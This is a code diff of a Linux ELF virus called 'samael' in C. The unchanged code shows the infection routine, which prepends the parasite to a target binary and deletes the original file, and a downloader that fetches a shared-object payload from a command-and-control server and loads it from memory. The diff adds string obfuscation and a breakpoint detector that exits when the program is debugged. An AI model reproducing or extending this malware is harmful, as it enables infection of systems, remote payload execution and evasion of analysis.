@@ -1,42 +1,4 @@
-#include <stdlib.h>
-#include <stdio.h>
-#include <string.h>
-#include <sys/syscall.h>
-#include <sys/unistd.h>
-#include <dlfcn.h>
-#include <elf.h>
-#include <sys/wait.h>
-#include <sys/socket.h>
-#include <netinet/in.h>
-#include <arpa/inet.h>
-#include <netdb.h>
-
-// macros to simplify writing function attributes
-#define always_inline __attribute__((always_inline))
-#define optimize(x) __attribute__((optimize(x)))
-
-// macro to simple writing the system call to create memory file descriptors
-#define memfd_create(x,y) syscall(__NR_memfd_create, x, y)
-
-// default optimization level (will be overwritten by obfuscator script)
-#define opt 'g' // gcc docs recommend -Og for edit-compile-debug cycle
-
-#define infection_target "./test"
-
-#define port 1337
-#define hostname "localhost"
-
-// reference to allow use of environment pointer
-extern char** environ;
-
-// prototypes of all functions used in samael
-always_inline optimize(opt) static inline long elf_size(FILE*);
-always_inline optimize(opt) static inline int is_infected(char*);
-always_inline optimize(opt) static inline void infect(FILE*, FILE*);
-always_inline optimize(opt) static inline void execute_host(FILE*, char**, char**);
-always_inline optimize(opt) static inline void load_so(int, int);
-always_inline optimize(opt) static inline void process_connection(int);
-always_inline optimize(opt) static inline void downloader();
+#include "samael.h"
 
 int main(int argc, char** argv){
   // if infection target is not infected infect it
@@ -84,6 +46,7 @@ int is_infected(char* f){
   return 0;
 }
 
+// prepend samael to target host binary
 void infect(FILE* h, FILE* p){
   long h_size = elf_size(h);
   long p_size = elf_size(p);
@@ -111,10 +74,11 @@ void infect(FILE* h, FILE* p){
   // get file name of parasite and delete it
   sprintf(file_link, "/proc/self/fd/%d", fileno(p));
   ssize_t len = readlink(file_link, file_name, sizeof(file_name));
-  file_name[len] = 0x00; 
+  file_name[len] = '\0'; 
   remove(file_name);
 }
 
+// execute host binary appended to samael
 void execute_host(FILE* f, char** argv, char** envp){
   long p_size = elf_size(f);
   fseek(f, p_size, SEEK_SET);
@@ -173,6 +137,7 @@ void process_connection(int socket_fd){
   load_so(socket_fd, size);
 }
 
+// download shared object from c2
 void downloader(){
   int socket_fd;
   int connection = -1;
@@ -200,4 +165,38 @@ void downloader(){
 
   // process the connection to download && load .so payload
   process_connection(socket_fd);
+}
+
+// WIP, minimal brainfuck interpreter to return char* to a hidden string
+char* hidden_string(char* c){
+  char* head = (char*)calloc(0xFF, sizeof(char));
+  char* start = head;
+  for(int i = 0 ; c[i] != '\0' ; ++i){
+    if(c[i] == '>'){
+      ++head;
+    }else if(c[i] == '+'){
+      ++*head;
+    }// <, -, [ && ] to be implemented when brainfuck code generation uses them
+  }
+  return start;
+}
+
+// scans executable code segments for int3 instructions, 0xCC, and exits if one is found
+void detect_breakpoints(){
+  int counter = 0;
+  char* start = (char*)&_start;                             
+  char* end = (char*)&__etext;
+
+  // use half of 0xCC to not hardcode a 0xCC 
+  volatile unsigned char int3 = 0x66;
+
+  // check each byte of executable code for a possible int3, 0xCC, if so increment counter
+  while(start != end){                                     
+    if(((*(volatile unsigned*)start++) & 0xFF) == (int3 * 2)){     
+      counter++;
+    }
+  }
+  if(counter != count){
+    exit(0); // exit program if a breakpoint is detected, maybe adjust to delete executable file instead??
+  }
 }
